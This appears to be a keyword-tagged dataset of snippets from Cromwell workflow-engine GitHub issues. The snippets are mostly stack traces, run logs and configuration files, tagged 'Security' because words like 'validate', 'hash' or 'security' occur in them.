Security,:192); at cromwell.engine.backend.io.filesystem.gcs.StorageFactory$.cromwellAuthenticated$lzycompute(StorageFactory.scala:20); at cromwell.engine.backend.io.filesystem.gcs.StorageFactory$.cromwellAuthenticated(StorageFactory.scala:18); at cromwell.engine.backend.local.LocalBackend$$anonfun$14.apply(LocalBackend.scala:239); at cromwell.engine.backend.local.LocalBackend$$anonfun$14.apply(LocalBackend.scala:239); at scala.util.Try.orElse(Try.scala:84); at cromwell.engine.backend.local.LocalBackend.fileSystems(LocalBackend.scala:239); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$1$1.apply(MaterializeWorkflowDescriptorActor.scala:89); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$1$1.apply(MaterializeWorkflowDescriptorActor.scala:86); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$1(MaterializeWorkflowDescriptorActor.scala:86); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2$$anonfun$apply$8.apply(MaterializeWorkflowDescriptorActor.scala:110); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2$$anonfun$apply$8.apply(MaterializeWorkflowDescriptorActor.scala:109); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2.apply(MaterializeWorkflowDescriptorActor.scala:109); at cromwell.engine.workflow.MaterializeWorkflowDescrip,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/705:2723,Validat,Validation,2723,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/705,2,['Validat'],['Validation']
Security,:30); wom.transforms.WomBundleMaker$Ops.toWomBundle(WomExecutableMaker.scala:16); wom.transforms.WomBundleMaker$Ops.toWomBundle$(WomExecutableMaker.scala:16); wom.transforms.WomBundleMaker$ops$$anon$2.toWomBundle(WomExecutableMaker.scala:16); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$.convert(FileElementToWomBundle.scala:82); wdl.draft3.transforms.wdlom2wom.package$.$anonfun$fileElementToWomBundle$1(package.scala:13); scala.util.Either$RightProjection.flatMap(Either.scala:702); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:36); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:32); cats.data.Kleisli.$anonfun$andThen$1(Kleisli.scala:37); languages.wdl.draft3.WdlDraft3LanguageFactory.getWomBundle(WdlDraft3LanguageFactory.scala:50); languages.wdl.draft3.WdlDraft3LanguageFactory.$anonfun$validateNamespace$2(WdlDraft3LanguageFactory.scala:39); scala.util.Either.flatMap(Either.scala:338); languages.wdl.draft3.WdlDraft3LanguageFactory.validateNamespace(WdlDraft3LanguageFactory.scala:38); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$buildWorkflowDescriptor$7(MaterializeWorkflowDescriptorActor.scala:242); cats.data.EitherT.$anonfun$flatMap$1(EitherT.scala:80); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:128); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$ano,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:8648,validat,validateNamespace,8648,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['validat'],['validateNamespace']
Security,":973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHtt",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:7897,secur,security,7897,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,":NA:1]: job id: projects/gred-cumulus-sb-01-991a49c4/operations/15427360049616748078; 2021-09-27 13:49:07,692 cromwell-system-akka.dispatchers.backend-dispatcher-35 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(075e0cf3)wf_hello.hello:NA:1]: Status change from - to Running; 2021-09-27 13:50:48,340 cromwell-system-akka.dispatchers.backend-dispatcher-34 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(075e0cf3)wf_hello.hello:NA:1]: Status change from Running to Failed; 2021-09-27 13:50:49,875 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - WorkflowManagerActor: Workflow 075e0cf3-194b-4f53-a43d-d31f0b370f79 failed (during ExecutingWorkflowState): java.lang.Exception: Task wf_hello.hello:NA:1 failed. The job was stopped before the command finished. PAPI error code 7. Execution failed: generic::permission_denied: pulling image: docker pull: running [""docker"" ""pull"" ""gcr.io/broad-cumulus/cellranger@sha256:a3e918f232f7ae125cf46bd38bff928bb92dafc8a8f9213c5e52be1de7924356""]: exit status 1 (standard error: ""Error response from daemon: pull access denied for gcr.io/broad-cumulus/cellranger, repository does not exist or may require 'docker login': denied: Permission denied for \""sha256:a3e918f232f7ae125cf46bd38bff928bb92dafc8a8f9213c5e52be1de7924356\"" from request \""/v2/broad-cumulus/cellranger/manifests/sha256:a3e918f232f7ae125cf46bd38bff928bb92dafc8a8f9213c5e52be1de7924356\"".\n""); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:91); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:803); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$handleExecutionFailure$1(PipelinesApiAsyncBackendJobExecutionActor.scala:815); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.google.pipelines.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6506:13125,access,access,13125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6506,1,['access'],['access']
Security,":expanse_figures.CBL_assoc:-1:1-20000000025 [b303ae23expanse_figures.CBL_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 13:07:47,67] [info] BT-322 58e64982:expanse_figures.CBL_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = C3078AB9F63DD3A59655953B1975D6CF.; [2023-03-29 13:07:47,67] [info] 58e64982-cf3d-4e77-ad72-acfda8299d1b-EngineJobExecutionActor-expanse_figures.CBL_assoc:NA:1 [58e64982]: Call cache hit process had 0 total hit failures before completing successfully; ```. Can someone help me diagnose why call caching isn't near instantaneous, and what I can do to make it much faster? Happy to provide more information as necessary. Thanks!. Config:; ```; # See https://cromwell.readthedocs.io/en/stable/Configuring/; # this configuration only accepts double quotes! not singule quotes; include required(classpath(""application"")). system {; abort-jobs-on-terminate = true; io {; number-of-requests = 30; per = 1 second; }; file-hash-cache = true; }. # necessary for call result caching; # will need to stand up the MySQL server each time before running cromwell; # stand it up on the same node that's running cromwell; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true""; user = ""root""; password = ""pass""; connectionTimeout = 5000; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. docker {; hash-lookup {; enabled = true; method = ""remote""; }; }. backend {; # which backend do you want to use?; # Right now I don't know how to choose this via command line, only here; default = ""Local"" # For running jobs on an interactive node; #default = ""SLURM"" # For running jobs by submitting them from an interactive node to the cluster; providers { ; # For running jobs on an interactive node; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigB",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:3191,hash,hash-cache,3191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['hash'],['hash-cache']
Security,; 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomBundleMakers$$anon$1.toWomBundle(WdlDraft2WomBundleMakers.scala:19); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomBundleMakers$$anon$1.toWomBundle(WdlDraft2WomBundleMakers.scala:17); 	at wom.transforms.WomBundleMaker$Ops.toWomBundle(WomExecutableMaker.scala:16); 	at wom.transforms.WomBundleMaker$Ops.toWomBundle$(WomExecutableMaker.scala:16); 	at wom.transforms.WomBundleMaker$ops$$anon$2.toWomBundle(WomExecutableMaker.scala:16); 	at languages.wdl.draft2.WdlDraft2LanguageFactory.$anonfun$getWomBundle$3(WdlDraft2LanguageFactory.scala:120); 	at scala.util.Either.flatMap(Either.scala:338); 	at languages.wdl.draft2.WdlDraft2LanguageFactory.$anonfun$getWomBundle$1(WdlDraft2LanguageFactory.scala:119); 	at scala.util.Either.flatMap(Either.scala:338); 	at languages.wdl.draft2.WdlDraft2LanguageFactory.getWomBundle(WdlDraft2LanguageFactory.scala:118); 	at womtool.input.WomGraphMaker$.$anonfun$getBundleAndFactory$1(WomGraphMaker.scala:49); 	at scala.util.Either.flatMap(Either.scala:338); 	at womtool.input.WomGraphMaker$.getBundleAndFactory(WomGraphMaker.scala:40); 	at womtool.input.WomGraphMaker$.getBundle(WomGraphMaker.scala:22); 	at womtool.validate.Validate$.validate(Validate.scala:14); 	at womtool.WomtoolMain$.dispatchCommand(WomtoolMain.scala:47); 	at womtool.WomtoolMain$.runWomtool(WomtoolMain.scala:134); 	at womtool.WomtoolMain$.delayedEndpoint$womtool$WomtoolMain$1(WomtoolMain.scala:139); 	at womtool.WomtoolMain$delayedInit$body.apply(WomtoolMain.scala:21); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at womtool.WomtoolMain$.main(WomtoolMain.scala:21); 	at womtool.WomtoolMain.main(WomtoolMain.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502:8999,validat,validate,8999,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502,4,"['Validat', 'validat']","['Validate', 'validate']"
Security,"; # https://github.com/broadinstitute/cromwell/issues. call-caching {; enabled = false; }. backend {; default = ""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; run-in-background = true; runtime-attributes = ""String? docker Int? max_runtime = 2""; submit = ""/bin/bash ${script}""; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash < ${script}"". # Root directory where Cromwell writes job results. This directory must be; # visible and writeable by the Cromwell process as well as the jobs that Cromwell; # launches.; root: ""cromwell-executions"". filesystems {; local {; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]. caching {; duplication-strategy: [; ""soft-link""; ]. # Possible values: file, path; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; hashing-strategy: ""path"". # When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; # If false or the md5 does not exist, will proceed with the above-defined hashing strategy.; check-sibling-md5: false; }; }; }; }; }; }; }. database {; db.url = ""jdbc:mysql://mysql-db/cromwell_db?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true""; db.user = ""cromwell""; db.password = ""cromwell""; db.driver = ""com.mysql.cj.jdbc.Driver""; profile = ""slick.jdbc.MySQLProfile$""; db.connectionTimeout = 15000; }; ```. and here is my cormwell dockerfile:. ```; FROM broadinstitute/cromwell:develop. RUN git clone https://github.com/vishnubob/wait-for-it.git; RUN mkdir cromwell-working-dir; WORKDIR cromwell-working-dir. COPY ./app-config /app-config. ENTRYPOINT [""/bin/sh"", ""-c""]; ```. when i submit a wdl did not use docker it ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7006:2000,hash,hashed,2000,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7006,1,['hash'],['hashed']
Security,"; 2021-09-27 13:48:20,511 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - WorkflowManagerActor: Successfully started WorkflowActor-075e0cf3-194b-4f53-a43d-d31f0b370f79; 2021-09-27 13:48:20,511 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2021-09-27 13:48:20,547 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; Sep 27, 2021 1:48:20 PM com.google.auth.oauth2.DefaultCredentialsProvider warnAboutProblematicCredentials; WARNING: Your application has authenticated using end user credentials from Google Cloud SDK. We recommend that most server applications use service accounts instead. If your application continues to use end user credentials from Cloud SDK, you might receive a ""quota exceeded"" or ""API not enabled"" error. For more information about service accounts, see https://cloud.google.com/docs/authentication/.; 2021-09-27 13:48:21,326 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - MaterializeWorkflowDescriptorActor [UUID(075e0cf3)]: Parsing workflow as WDL draft-2; 2021-09-27 13:48:22,359 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - MaterializeWorkflowDescriptorActor [UUID(075e0cf3)]: Call-to-Backend assignments: wf_hello.hello -> PAPIv2; 2021-09-27 13:48:24,671 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - WorkflowExecutionActor-075e0cf3-194b-4f53-a43d-d31f0b370f79 [UUID(075e0cf3)]: Starting wf_hello.hello; 2021-09-27 13:48:29,304 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Assigned new job execution tokens to the following groups: 075e0cf3: 1; 2021-09-27 13:48:31,233 cromwell-system-akka.dispatchers.engine-dispatcher-12 INFO - BT-322 075e0cf3:wf_hello.hello:-1:1 is eligible for call caching with read = true and write = true; 2021-09-27 13:48:31,314 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - BT-322 0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6506:10002,authenticat,authentication,10002,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6506,1,['authenticat'],['authentication']
Security,"; [2019-02-11 10:13:14,71] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-02-11 10:13:14,75] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-02-11 10:13:15,05] [info] Running with database db.url = jdbc:hsqldb:mem:6b5d8035-4932-4680-b912-34885765f705;shutdown=false;hsqldb.tx=mvcc; [2019-02-11 10:13:15,63] [info] Slf4jLogger started; [2019-02-11 10:13:16,02] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-1ddecb5"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2019-02-11 10:13:16,08] [info] Metadata summary refreshing every 2 seconds.; [2019-02-11 10:13:16,20] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-02-11 10:13:16,23] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-02-11 10:13:16,25] [warn] 'docker.hash-lookup.gcr-api-queries-per-100-seconds' is being deprecated, use 'docker.hash-lookup.gcr.throttle' instead (see reference.conf); [2019-02-11 10:13:16,26] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2019-02-11 10:13:16,33] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2019-02-11 10:13:17,45] [info] SingleWorkflowRunnerActor: Version 37; [2019-02-11 10:13:17,46] [info] SingleWorkflowRunnerActor: Submitting workflow; [2019-02-11 10:13:17,59] [info] Unspecified type (Unspecified version) workflow 52999e15-953f-44d6-aaae-1774c74d2910 submitted; [2019-02-11 10:13:17,65] [info] SingleWorkflowRunnerActor: Workflow submitted 52999e15-953f-44d6-aaae-1774c74d2910; [2019-02-11 10:13:17,65] [info] 1 new workflows fetched; [2019-02-11 10:13:17,66] [info] WorkflowManagerActor Starting workflow 52999e15-953f-44d6-aaae-1774c74d2910; [2019-02-11 10:13:17,67] [info] WorkflowManagerActor Successfully started WorkflowActor-529",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4626:2349,hash,hash-lookup,2349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4626,1,['hash'],['hash-lookup']
Security,; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpReques,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8196,secur,security,8196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"; centrifugeOutput= centrifuge.outputDir,; domain=centrifuge.domain,; database=if defined(centrifuge.database) then centrifuge.database else ""refseq""; }; }; }; ```; The `centrifugeList` is a list of dictionaries. The resulting `centrifuge` `object` may or may not have a key database. . ## Expected behaviour:; `database` defaults to `""refseq""` if no `database` key is present in the dictionary. It will use the database key if it exists. ## Observed behaviour:; ```; java.lang.RuntimeException: Evaluating if defined(centrifuge.database) then centrifuge.database else ""refseq"" failed: Could not find key database in WdlObject; at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.$anonfun$processRunnable$2(ExpressionKey.scala:36); at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.$anonfun$processRunnable$2$adapted(ExpressionKey.scala:31); at scala.Function1.$anonfun$andThen$1(Function1.scala:52); at cats.data.Validated.fold(Validated.scala:14); at cats.data.Validated.bimap(Validated.scala:109); at cats.data.Validated.map(Validated.scala:152); at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.processRunnable(ExpressionKey.scala:31); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$4(WorkflowExecutionActor.scala:452); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$2(WorkflowExecutionActor.scala:449); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$1(WorkflowExecutionActor.scala:448); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.processRunnableTaskCallInputExpression(WorkflowExecutionActor.scala:447); at cromwell.engine.workflow.lifecycle.execution.Workf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3093:1108,Validat,Validated,1108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3093,1,['Validat'],['Validated']
Security,"; version 1.0. workflow wdl_v1_tests {; scatter (x in [0]) {; scatter (y in [0]) {; call input_default_not_used; }; }; }. task input_default_not_used {; input { String greeting = ""hello"" }; command { echo ~{greeting} }; runtime { docker: ""bash"" }; }; ```. ```; [2018-06-08 01:30:26,49] [error] WorkflowManagerActor Workflow 58ccc276-40f7-447c-bbff-87a47aa7163e failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; key not found: wdl_v1_tests.input_default_not_used.greeting; scala.collection.immutable.Map$Map1.apply(Map.scala:111); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.$anonfun$convertInnerScatter$8(ScatterElementToGraphNode.scala:103); scala.collection.immutable.List.map(List.scala:283); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.$anonfun$convertInnerScatter$7(ScatterElementToGraphNode.scala:102); cats.data.Validated.map(Validated.scala:194); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.convertInnerScatter(ScatterElementToGraphNode.scala:99); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.convert(ScatterElementToGraphNode.scala:31); wdl.draft3.transforms.wdlom2wom.graph.WorkflowGraphElementToGraphNode$.convert(WorkflowGraphElementToGraphNode.scala:49); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$1(WorkflowDefinitionElementToWomWorkflowDefinition.scala:82); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.graphNodeCreationFold$1(WorkflowDefinitionElementToWomWorkflowDefinition.scala:77); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$6(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); scala.collection.LinearSeqOpti",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:1061,Validat,Validated,1061,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['Validat'],['Validated']
Security,"<!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; Validating a workflow with circular imports causes a stack overflow in womtool. ## Expected behavior; I'm the fool who wrote a workflow with circular imports, but if womtool is here to check for errors, I'd like for it to suggest exactly how I'm being foolish. Something like miniwdl's output would work, where it follows the trail of imports and eventually says ""hey, this could be circular.""; ```; >miniwdl check ../fairyland/ld-pruning/ld-pruning-wf.wdl. (../fairyland/ld-pruning/ld-pruning-wf.wdl Ln 5 Col 1) Failed to import https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl; (https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl Ln 3 Col 1) Failed to import https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl; (https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl Ln 3 Col 1) Failed to import https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl; (https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl Ln 3 Col 1) Failed to import https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl; (https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl Ln 3 Col 1) Failed to import https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl; (https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl Ln 3 Col 1) Failed to import https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl; (https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl Ln 3 Col 1) Failed to import https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl; (https://",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6964:105,Validat,Validating,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6964,1,['Validat'],['Validating']
